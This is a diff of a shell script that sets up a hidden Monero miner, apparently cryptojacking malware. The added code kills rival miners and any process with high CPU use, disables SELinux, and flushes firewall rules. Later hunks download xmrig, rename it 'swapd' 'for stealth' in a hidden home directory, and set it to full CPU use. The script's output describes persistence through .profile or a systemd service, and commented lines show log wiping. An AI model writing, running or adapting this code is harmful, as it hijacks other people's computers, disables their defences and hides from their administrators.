@@ -161,10 +161,499 @@ fi
 WALLET=$1
 EMAIL=$2 # this one is optional
 
-#echo "[*] #executing #BotKiller..."
-#curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
-#curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kill-miner.sh | bash
-#curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash
+# ========================================================================
+# =============== INTEGRATED MINER KILLER SCRIPTS ========================
+# ========================================================================
+
+echo ""
+echo "========================================================================="
+echo "[*] Executing comprehensive miner killer suite..."
+echo "========================================================================="
+echo ""
+
+# ======== SCRIPT 1: MinerKiller.sh ========
+echo "[*] Running MinerKiller.sh..."
+
+# Killing processes by name, path, arguments and CPU utilization
+minerkiller_processes(){
+	killme() {
+	  killall -9 chron-34e2fg 2>/dev/null
+	  ps wx|awk '/34e|r\/v3|moy5|defunct/' | awk '{print $1}' 2>/dev/null &
+	}
+
+	killa() {
+	what=$1;ps auxw|awk "/$what/" |awk '!/awk/' | awk '{print $2}'|xargs kill -9 2>/dev/null &
+	}
+
+	killa 34e2fg
+	killme
+	
+	# Killing big CPU
+	VAR=$(ps uwx|awk '{print $2":"$3}'| grep -v CPU)
+	for word in $VAR
+	do
+	  CPUUSAGE=$(echo $word|awk -F":" '{print $2}'|awk -F"." '{ print $1}')
+	  if [ $CPUUSAGE -gt 60 ]; then 
+	    echo "High CPU process detected: $word"
+	    PID=$(echo $word | awk -F":" '{print $1}')
+	    LINE=$(ps uwx | grep $PID)
+	    COUNT=$(echo $LINE| grep -P "er/v5|34e2|Xtmp|wf32N4|moy5Me|ssh"|wc -l)
+	    if [ $COUNT -eq 0 ]; then 
+	      echo "Killing suspicious process: $PID"
+	      kill -9 $PID 2>/dev/null
+	    fi
+	  fi
+	done
+
+	killall \.Historys 2>/dev/null
+	killall \.sshd 2>/dev/null
+	killall neptune 2>/dev/null
+	killall xm64 2>/dev/null
+	killall xm32 2>/dev/null
+	killall xmrig 2>/dev/null
+	killall \.xmrig 2>/dev/null
+	killall suppoieup 2>/dev/null
+
+	pkill -f sourplum
+	pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
+	
+	kill -9 $(pgrep -f -u root mine.moneropool.com) 2>/dev/null
+	kill -9 $(pgrep -f -u root xmr.crypto-pool.fr:8080) 2>/dev/null
+	kill -9 $(pgrep -f -u root xmr.crypto-pool.fr:3333) 2>/dev/null
+	kill -9 $(pgrep -f -u root monerohash.com) 2>/dev/null
+	kill -9 $(pgrep -f -u root /tmp/a7b104c270) 2>/dev/null
+	kill -9 $(pgrep -f -u root xmr.crypto-pool.fr:6666) 2>/dev/null
+	kill -9 $(pgrep -f -u root xmr.crypto-pool.fr:7777) 2>/dev/null
+	kill -9 $(pgrep -f -u root xmr.crypto-pool.fr:443) 2>/dev/null
+	kill -9 $(pgrep -f -u root stratum.f2pool.com:8888) 2>/dev/null
+	kill -9 $(pgrep -f -u root xmrpool.eu) 2>/dev/null
+	kill -9 $(pgrep -f -u root xmrig) 2>/dev/null
+	kill -9 $(pgrep -f -u root xmrigDaemon) 2>/dev/null
+	kill -9 $(pgrep -f -u root xmrigMiner) 2>/dev/null
+	kill -9 $(pgrep -f -u root /var/tmp/java) 2>/dev/null
+	kill -9 $(pgrep -f -u root ddgs) 2>/dev/null
+	kill -9 $(pgrep -f -u root qW3xT) 2>/dev/null
+	kill -9 $(pgrep -f -u root t00ls.ru) 2>/dev/null
+	kill -9 $(pgrep -f -u root /var/tmp/sustes) 2>/dev/null
+	kill -9 $(pgrep -f -u root config.json) 2>/dev/null
+ 	kill -9 $(pgrep -f -u root kswapd0) 2>/dev/null
+
+	kill -9 $(pgrep -f -u root xiaoyao) 2>/dev/null
+	kill -9 $(pgrep -f -u root named) 2>/dev/null
+	kill -9 $(pgrep -f -u root kernelcfg) 2>/dev/null
+	kill -9 $(pgrep -f -u root xiaoxue) 2>/dev/null
+	kill -9 $(pgrep -f -u root kernelupgrade) 2>/dev/null
+	kill -9 $(pgrep -f -u root kernelorg) 2>/dev/null
+	kill -9 $(pgrep -f -u root kernelupdates) 2>/dev/null
+
+	ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9 2>/dev/null
+	ps ax|grep -o './[0-9]* -c'| xargs pkill -f 2>/dev/null
+
+	pkill -f /usr/bin/.sshd
+	pkill -f acpid
+	pkill -f AnXqV.yam
+	pkill -f apacheha
+	pkill -f askdljlqw
+	pkill -f bashe
+	pkill -f bashf
+	pkill -f bashg
+	pkill -f bashh
+	pkill -f bashx
+	pkill -f BI5zj
+	pkill -f biosetjenkins
+	pkill -f bonn.sh
+	pkill -f bonns
+	pkill -f conn.sh
+	pkill -f conns
+	pkill -f cryptonight
+	pkill -f crypto-pool
+	pkill -f ddg.2011
+	pkill -f deamon
+	pkill -f disk_genius
+	pkill -f donns
+	pkill -f Duck.sh
+	pkill -f gddr
+	pkill -f Guard.sh
+	pkill -f i586
+	pkill -f icb5o
+	pkill -f ir29xc1
+	pkill -f irqba2anc1
+	pkill -f irqba5xnc1
+	pkill -f irqbalanc1
+	pkill -f irqbalance
+	pkill -f irqbnc1
+	pkill -f JnKihGjn
+	pkill -f jweri
+	pkill -f kw.sh
+	pkill -f kworker34
+	pkill -f kxjd
+	pkill -f libapache
+	pkill -f Loopback
+	pkill -f lx26
+	pkill -f mgwsl
+	pkill -f minerd
+	pkill -f minergate
+	pkill -f minexmr
+	pkill -f mixnerdx
+	pkill -f mstxmr
+	pkill -f nanoWatch
+	pkill -f nopxi
+	pkill -f NXLAi
+	pkill -f performedl
+	pkill -f polkitd
+	pkill -f pro.sh
+	pkill -f pythno
+	pkill -f qW3xT.2
+	pkill -f sourplum
+	pkill -f stratum
+	pkill -f sustes
+	pkill -f wnTKYg
+	pkill -f XbashY
+	pkill -f XJnRj
+	pkill -f xmrig
+	pkill -f xmrigDaemon
+	pkill -f xmrigMiner
+	pkill -f ysaydh
+	pkill -f zigw
+	
+	# crond
+	ps ax | grep crond | grep -v grep | awk '{print $1}' > /tmp/crondpid 2>/dev/null
+	while read crondpid
+	do
+		if [ $(echo  $(ps -p $crondpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
+		then
+			kill $crondpid 2>/dev/null
+			rm -rf /var/tmp/v3
+		fi
+	done < /tmp/crondpid
+	rm /tmp/crondpid -f 2>/dev/null
+	 
+	# sshd - skip legitimate SSH
+ 	ps ax | grep sshd | grep -v grep | awk '{print $1}' > /tmp/sshdpid 2>/dev/null
+	while read sshdpid
+	do
+		if [ $(echo  $(ps -p $sshdpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
+		then
+			kill $sshdpid 2>/dev/null
+		fi
+	done < /tmp/sshdpid
+	rm -f /tmp/sshdpid 2>/dev/null
+
+	# syslog
+	ps ax | grep syslog | grep -v grep | awk '{print $1}' >  /tmp/syslogpid 2>/dev/null
+	while read syslogpid
+	do
+		if [ $(echo  $(ps -p $syslogpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
+		then
+			kill  $syslogpid 2>/dev/null
+		fi
+	done < /tmp/syslogpid
+	rm /tmp/syslogpid -f 2>/dev/null
+}
+
+# Removing miners by known path IOC
+minerkiller_files(){
+	rm /tmp/.cron 2>/dev/null
+	rm /tmp/.main 2>/dev/null
+	rm /tmp/.yam* -rf 2>/dev/null
+	rm -f /tmp/irq 2>/dev/null
+	rm -f /tmp/irq.sh 2>/dev/null
+	rm -f /tmp/irqbalanc1 2>/dev/null
+	rm -rf /boot/grub/deamon 2>/dev/null
+	rm -rf /boot/grub/disk_genius 2>/dev/null
+	rm -rf /tmp/*httpd.conf 2>/dev/null
+	rm -rf /tmp/*httpd.conf* 2>/dev/null
+	rm -rf /tmp/*index_bak* 2>/dev/null
+	rm -rf /tmp/.systemd-private-* 2>/dev/null
+	rm -rf /tmp/.xm* 2>/dev/null
+	rm -rf /tmp/a7b104c270 2>/dev/null
+	rm -rf /tmp/conn 2>/dev/null
+	rm -rf /tmp/conns 2>/dev/null
+	rm -rf /tmp/httpd.conf 2>/dev/null
+	rm -rf /tmp/java* 2>/dev/null
+	rm -rf /tmp/kworkerds 2>/dev/null
+	rm -rf /bin/kworkerds 2>/dev/null
+	rm -rf /bin/config.json 2>/dev/null
+	rm -rf /var/tmp/kworkerds 2>/dev/null
+	rm -rf /var/tmp/config.json 2>/dev/null
+	rm -rf /usr/local/lib/libjdk.so 2>/dev/null
+	rm -rf /tmp/qW3xT.2 2>/dev/null
+	rm -rf /tmp/ddgs.3013 2>/dev/null
+	rm -rf /tmp/ddgs.3012 2>/dev/null
+	rm -rf /tmp/wnTKYg 2>/dev/null
+	rm -rf /tmp/2t3ik 2>/dev/null
+	rm -rf /tmp/root.sh 2>/dev/null
+	rm -rf /tmp/pools.txt 2>/dev/null
+	rm -rf /tmp/libapache 2>/dev/null
+	rm -rf /tmp/config.json 2>/dev/null
+	rm -rf /tmp/bashf 2>/dev/null
+	rm -rf /tmp/bashg 2>/dev/null
+	rm -rf /tmp/libapache 2>/dev/null
+	rm -rf /tmp/xm* 2>/dev/null
+	rm -rf /var/tmp/java* 2>/dev/null
+}
+
+# Killing and blocking miners by network related IOC
+minerkiller_network(){
+	# Kill by known ports/IPs
+ 	kill -9 $(netstat -anp 2>/dev/null | grep 91.214.65.238:58091 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep 140.82.52.87 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	kill -9 $(netstat -anp 2>/dev/null | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}') 2>/dev/null
+	
+	# Block known miner ports (temporary - will be restored later if needed)
+	iptables -F 2>/dev/null
+	iptables -X 2>/dev/null
+	
+	iptables -A OUTPUT -p tcp --dport 3333 -j DROP 2>/dev/null
+	iptables -A OUTPUT -p tcp --dport 5555 -j DROP 2>/dev/null
+	iptables -A OUTPUT -p tcp --dport 7777 -j DROP 2>/dev/null
+	iptables -A OUTPUT -p tcp --dport 9999 -j DROP 2>/dev/null
+	service iptables reload 2>/dev/null
+}
+
+minerkiller_files
+minerkiller_processes
+minerkiller_network
+echo "[*] MinerKiller.sh completed"
+
+# ======== SCRIPT 2: kill-miner-nomail.sh ========
+echo "[*] Running kill-miner-nomail.sh..."
+
+binary_names="(kernelupdates)|(kernelcfg)|(kernelorg)|(kernelupgrade)|(named)"
+
+# look for all UID running miner processes
+user_id=$(ps -ef | egrep $binary_names | grep -v grep | awk '{print $1}')
+
+# put UIDs in an array to account for multiple broken accounts
+arr_user_id=($user_id)
+
+# check to see if the array of user id's is empty
+if [ ${#arr_user_id[@]} = 0 ]; then
+    echo "First heuristic found no processes"
+else
+    echo "Notice: Suspect process found, investigating..."
+    # process each UID found
+    for user_id_single in "${arr_user_id[@]}"
+    do
+        # get the PID of the process in this iteration of the loop
+        miner_pid=$(ps -ef | grep ${user_id_single} | egrep $binary_names | awk '{print $2}')
+        arr_miner_pid=($miner_pid)
+        if [ ! ${#arr_miner_pid[@]} = 0 ]; then
+            for miner_pid_single in "${arr_miner_pid[@]}"
+            do
+                # look up and populate the path to the process binary
+                pid_binary_path=$(ls -l /proc/${miner_pid_single}/exe 2>/dev/null | awk '{print $11}')
+                pid_directory_path=$(ls -l /proc/${miner_pid_single}/exe 2>/dev/null | awk '{print $11}' | sed "s/\/[^\/]*$//")
+
+                # try to kill the process
+                if kill -9 $miner_pid_single 2>/dev/null; then
+                    echo "Notice: Mining process ${miner_pid_single} killed."
+                else
+                    echo "Error: Attempt to kill process ${miner_pid_single} failed."
+                fi
+
+                # try to remove the binary of the PID
+                if rm -rf ${pid_binary_path} 2>/dev/null; then
+                    echo "Notice: Mining binary ${pid_binary_path} removed."
+                else
+                    echo "Error: Attempt to remove mining binary ${pid_binary_path} failed."
+                fi
+
+                # look for existence of mining tarball
+                # if found attempt removal
+                if [ -f ${pid_directory_path}/32.tar.gz ]; then
+                    echo "Notice: Tarball found"
+                    if rm -rf ${pid_directory_path}/32.tar.gz 2>/dev/null; then
+                        echo "Notice: Tarball ${pid_directory_path}/32.tar.gz removed."
+                    else
+                        echo "Error: Attempt to remove tarball ${pid_directory_path}/32.tar.gz failed."
+                    fi
+                else
+                    echo "Notice: Tarball not found."
+                fi
+            done
+        fi
+
+        echo ${user_id_single}
+    done
+fi
+
+# sites determined as bad
+bad_sites="(updates.dyndn-web)|(updates.dyndn-web.com)"
+
+# look for all UID running wget to the established suspect site(s) processes
+user_id=$(ps -ef | grep -i wget | egrep -i $bad_sites  | grep -v grep | awk '{print $1}' | sort -u)
+
+# put UIDs in an array to account for multiple broken accounts
+arr_user_id=($user_id)
+
+# check to see if the array of user id's is empty
+if [ ${#arr_user_id[@]} = 0 ]; then
+  echo "Second heuristic found no processes"
+else
+  echo "Notice: Suspect process found, investigating..."
+
+  # kill each of the wget processes
+  ps -ef | grep wget | grep updates.dyndn-web | grep -v grep | awk '{print $2}' | xargs kill -9 2>/dev/null
+
+  # sanitize the user crontab
+  echo "Sanitizing user crontabs"
+  for user_id_single in "${arr_user_id[@]}"
+  do
+    sed -i '/updates.dyndn-web/d' /var/spool/cron/${user_id_single} 2>/dev/null
+
+    # return the user id for account suspension
+    echo ${user_id_single}
+  done
+fi
+
+echo "[*] kill-miner-nomail.sh completed"
+
+# ======== SCRIPT 3: minerkill.sh ========
+echo "[*] Running minerkill.sh..."
+
+setenforce 0 2>/dev/null
+echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
+sync && echo 3 >/proc/sys/vm/drop_caches
+
+ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9 2>/dev/null
+ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9 2>/dev/null
+ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9 2>/dev/null
+ps ax|grep -o './[0-9]* -c'| xargs pkill -f 2>/dev/null
+
+pkill -f biosetjenkins
+pkill -f Loopback
+pkill -f apaceha
+pkill -f cryptonight
+pkill -f stratum
+pkill -f mixnerdx
+pkill -f performedl
+pkill -f JnKihGjn
+pkill -f irqba2anc1
+pkill -f irqba5xnc1
+pkill -f irqbnc1
+pkill -f ir29xc1
+pkill -f conns
+pkill -f irqbalance
+pkill -f crypto-pool
+pkill -f minexmr
+pkill -f XJnRj
+pkill -f mgwsl
+pkill -f pythno
+pkill -f jweri
+pkill -f lx26
+pkill -f NXLAi
+pkill -f BI5zj
+pkill -f askdljlqw
+pkill -f minerd
+pkill -f minergate
+pkill -f Guard.sh
+pkill -f ysaydh
+pkill -f bonns
+pkill -f donns
+pkill -f kxjd
+pkill -f Duck.sh
+pkill -f bonn.sh
+pkill -f conn.sh
+pkill -f kworker34
+pkill -f kw.sh
+pkill -f pro.sh
+pkill -f polkitd
+pkill -f acpid
+pkill -f icb5o
+pkill -f nopxi
+pkill -f irqbalanc1
+pkill -f minerd
+pkill -f i586
+pkill -f gddr
+pkill -f mstxmr
+pkill -f ddg.2011
+pkill -f wnTKYg
+pkill -f deamon
+pkill -f disk_genius
+pkill -f sourplum
+pkill -f polkitd
+pkill -f nanoWatch
+pkill -f zigw
+
+# Commented out crontab removal - don't want to clear our own cron
+# crontab -r
+
+ps axf -o "pid"|while read procid
+do
+        ls -l /proc/$procid/exe 2>/dev/null | grep /tmp
+        if [ $? -ne 1 ]
+        then
+                cat /proc/$procid/cmdline 2>/dev/null | grep -a -E "devtool|update.sh"
+                if [ $? -ne 0 ]
+                then
+                        kill -9 $procid 2>/dev/null
+                else
+                        echo "Protected process - don't kill"
+                fi
+        fi
+done
+
+ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
+do
+        cat /proc/$procid/cmdline 2>/dev/null | grep -a -E "devtool|update.sh"
+        if [ $? -ne 0 ]
+        then
+                kill -9 $procid 2>/dev/null
+        else
+                echo "Protected process - don't kill"
+        fi
+done
+
+iptables -F 2>/dev/null
+iptables -X 2>/dev/null
+iptables -A OUTPUT -p tcp --dport 3333 -j DROP 2>/dev/null
+iptables -A OUTPUT -p tcp --dport 5555 -j DROP 2>/dev/null
+iptables -A OUTPUT -p tcp --dport 7777 -j DROP 2>/dev/null
+iptables -A OUTPUT -p tcp --dport 9999 -j DROP 2>/dev/null
+service iptables reload 2>/dev/null
+
+ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9 2>/dev/null
+
+# Don't clear history - we want to keep track
+# history -c
+# echo > /var/spool/mail/root
+# echo > /var/log/wtmp
+# echo > /var/log/secure
+
+echo "[*] minerkill.sh completed"
+
+echo ""
+echo "========================================================================="
+echo "[*] Miner killer suite execution completed!"
+echo "========================================================================="
+echo ""
+
+# ========================================================================
+# ============== END OF INTEGRATED MINER KILLER SCRIPTS ==================
+# ========================================================================
 
 echo "[*] #checking prerequisites..."
 
@@ -212,7 +701,7 @@ echo "[*] #calculating port..."
 
 CPU_THREADS=$(nproc)
 EXP_MONERO_HASHRATE=$((CPU_THREADS * 700 / 1000))
-if [ -z $EXP_MONERO_HASHRATE ]; then
+if [ -z "$EXP_MONERO_HASHRATE" ]; then
   echo "ERROR: Can't compute projected Monero CN hashrate"
   exit 1
 fi
@@ -270,7 +759,7 @@ power2() {
 echo "[*] #printing intentions..."
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by "$HOME"/.swapd/swapd.sh script."
+echo "If needed, miner in foreground can be started by $HOME/.swapd/swapd.sh script."
 echo "Mining will happen to $WALLET wallet."
 if [ -n "$EMAIL" ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
@@ -278,375 +767,200 @@ fi
 echo
 
 if ! sudo -n true 2>/dev/null; then
-  echo "Since I can't do passwordless sudo, mining in background will started from your "$HOME"/.profile file first time you login this host after reboot."
+  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
 else
-  echo "Mining in background will be performed using moneroocean_miner systemd service."
+  echo "Mining in background will be performed using swapd systemd service."
 fi
 
-echo
+echo ""
 echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
-echo
+echo ""
 
-echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
-sleep 3
-echo
-echo
-
-echo "[*] #start doing stuff: preparing miner..."
-
-echo "[*] Removing previous moneroocean miner (if any)"
+echo "[*] #removing previous moneroocean miner (if any)..."
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop moneroocean_miner.service
-  sudo systemctl stop gdm2.service
+  sudo systemctl stop swapd.service 2>/dev/null
 fi
-killall -9 xmrig
-killall -9 kswapd0
+killall -9 swapd 2>/dev/null
+killall -9 xmrig 2>/dev/null
+rm -rf "$HOME"/.swapd
+rm -rf "$HOME"/xmrig*
 
-echo "[*] Removing previous directories..."
-rm -rf "$HOME"/moneroocean
-rm -rf "$HOME"/.moneroocean
-rm -rf "$HOME"/.gdm2*
-#rm -rf "$HOME"/.swapd
-
-echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-#  exit 1
+echo "[*] #downloading advanced version of xmrig to /tmp..."
+if [ ! -d /tmp ]; then
+  mkdir /tmp
 fi
 
-wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz
-# curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o "$HOME"/.swapd/xmrig.tar.gz
+# Save current directory and switch to /tmp
+ORIGINAL_DIR=$(pwd)
+cd /tmp || exit 1
 
-echo "[*] Unpacking xmrig.tar.gz to "$HOME"/.swapd/"
-[ -d "$HOME"/.swapd/ ] || mkdir "$HOME"/.swapd/
-if ! tar xzfv /tmp/xmrig.tar.gz -C "$HOME"/.swapd/; then
-  echo "ERROR: Can't unpack xmrig.tar.gz to "$HOME"/.swapd/ directory"
-#  exit 1
+if ! type curl >/dev/null; then
+  apt-get update -y
+  apt-get install -y curl
 fi
-rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of "$HOME"/.swapd/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$HOME"/.swapd/config.json
-"$HOME"/.swapd/xmrig --help >/dev/null
-if test $? -ne 0; then
-  if [ -f "$HOME"/.swapd/xmrig ]; then
-    echo "WARNING: Advanced version of "$HOME"/.swapd/xmrig is not functional"
+LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+' | head -1)
+LATEST_XMRIG_VERSION="${LATEST_XMRIG_RELEASE#v}"  # Strip the 'v' prefix for directory name
+LATEST_XMRIG_LINUX_RELEASE="xmrig-$LATEST_XMRIG_RELEASE-linux-static-x64.tar.gz"
+
+# Detect architecture
+ARCH=$(uname -m)
+if [ "$ARCH" == "aarch64" ] || [ "$ARCH" == "arm64" ]; then
+    LATEST_XMRIG_LINUX_RELEASE="xmrig-$LATEST_XMRIG_RELEASE-linux-static-arm64.tar.gz"
+fi
+
+if curl -L --progress-bar "https://github.com/xmrig/xmrig/releases/download/$LATEST_XMRIG_RELEASE/$LATEST_XMRIG_LINUX_RELEASE" -o /tmp/xmrig.tar.gz; then
+  echo "[*] Download successful, extracting..."
+  echo "[*] Current directory: $(pwd)"
+  
+  tar xf /tmp/xmrig.tar.gz -C /tmp
+  
+  # Debug: show what was extracted
+  echo "[*] Looking for extracted directory: /tmp/xmrig-$LATEST_XMRIG_VERSION"
+  
+  if [ -d "/tmp/xmrig-$LATEST_XMRIG_VERSION" ]; then
+    echo "[*] Found extracted directory, moving to $HOME/.swapd"
+    mv "/tmp/xmrig-$LATEST_XMRIG_VERSION" "$HOME"/.swapd
+    ls -la "$HOME"/.swapd/
   else
-    echo "WARNING: Advanced version of "$HOME"/.swapd/xmrig was removed by antivirus (or some other problem)"
+    echo "ERROR: Extracted directory /tmp/xmrig-$LATEST_XMRIG_VERSION not found!"
+    echo "Checking what exists in /tmp:"
+    ls -la /tmp/ | grep xmrig
+    exit 1
   fi
-
-  echo "[*] Looking for the latest version of Monero miner"
-  LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest | grep -o '".*"' | sed 's/"//g')
-  LATEST_XMRIG_LINUX_RELEASE="https://github.com"$(curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" | cut -d \" -f2)
-
-  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
-  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
-    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
- #   exit 1
+  
+  rm -f /tmp/xmrig.tar.gz
+  
+  # Rename xmrig to swapd for stealth
+  if [ -f "$HOME"/.swapd/xmrig ]; then
+    echo "[*] Renaming xmrig to swapd..."
+    mv "$HOME"/.swapd/xmrig "$HOME"/.swapd/swapd
+    chmod +x "$HOME"/.swapd/swapd
+    echo "[*] Successfully renamed to swapd"
+  else
+    echo "ERROR: $HOME/.swapd/xmrig not found after extraction!"
+    echo "Contents of $HOME/.swapd/:"
+    ls -la "$HOME"/.swapd/
+    exit 1
   fi
-
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to "$HOME"/.swapd/"
-  if ! tar xzfv /tmp/xmrig.tar.gz -C "$HOME"/.swapd --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to "$HOME"/.swapd/ directory"
-  fi
-  rm /tmp/xmrig.tar.gz
-
-  rm -rf "$HOME"/.swapd/config.json
-  wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O "$HOME"/.swapd/config.json
-  curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output "$HOME"/.swapd/config.json
-
-  echo "[*] Checking if stock version of "$HOME"/.swapd/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$HOME"/.swapd/config.json
-  "$HOME"/.swapd/xmrig --help >/dev/null
-  if test $? -ne 0; then
-    if [ -f "$HOME"/.swapd/xmrig ]; then
-      echo "ERROR: Stock version of "$HOME"/.swapd/xmrig is not functional too"
-    else
-      echo "ERROR: Stock version of "$HOME"/.swapd/xmrig was removed by antivirus too"
-    fi
-    #    exit 1
-  fi
+else
+  echo "ERROR: Can't download https://github.com/xmrig/xmrig/releases/download/$LATEST_XMRIG_RELEASE/$LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
+  exit 1
 fi
 
-echo "[*] Miner "$HOME"/.swapd/xmrig is OK"
+echo "[*] #checking if advanced version of $LATEST_XMRIG_RELEASE xmrig was downloaded properly..."
+ARCH=$(uname -m)
+if [ ! -f "$HOME/.swapd/swapd" ]; then
+  echo "WARNING: Advanced version of xmrig was not downloaded!"
+else
+  echo "Hooray: Advanced version of xmrig was downloaded and renamed to swapd successfully!"
+fi
 
-echo "mv "$HOME"/.swapd/xmrig "$HOME"/.swapd/swapd"
-mv "$HOME"/.swapd/xmrig "$HOME"/.swapd/swapd
-
-echo "sed"
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:80",/' "$HOME"/.swapd/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' "$HOME"/.swapd/config.json
-#sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",/' "$HOME"/.swapd/config.json
-#sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' "$HOME"/.swapd/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' "$HOME"/.swapd/config.json
-#sed -i 's#"log-file": *null,#"log-file": "'"$HOME"/.swapd/swapd.log'",#' "$HOME"/.swapd/config.json
-#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' "$HOME"/.swapd/config.json
-#sed -i 's/"enabled": *[^,]*,/"enabled": true,/' "$HOME"/.swapd/config.json
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$HOME"/.swapd/config.json
